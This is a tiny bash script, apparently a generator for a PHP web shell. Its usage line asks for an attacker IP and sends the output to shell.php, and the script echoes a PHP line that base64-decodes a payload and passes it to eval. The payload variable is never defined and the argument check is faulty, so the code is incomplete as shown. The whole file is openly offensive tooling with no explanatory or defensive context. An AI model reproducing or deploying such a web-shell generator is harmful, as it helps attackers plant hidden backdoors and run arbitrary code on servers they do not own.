#!/bin/bash

function help() {
	echo "Usage: $0 <attacker_ip> > shell.php"
	exit 0
}

if [[ $? -ne 1 ]]; then
	help;
fi

echo "<?php \$s=$PAYLOAD;eval(base64_decode(\$s)); ?>"
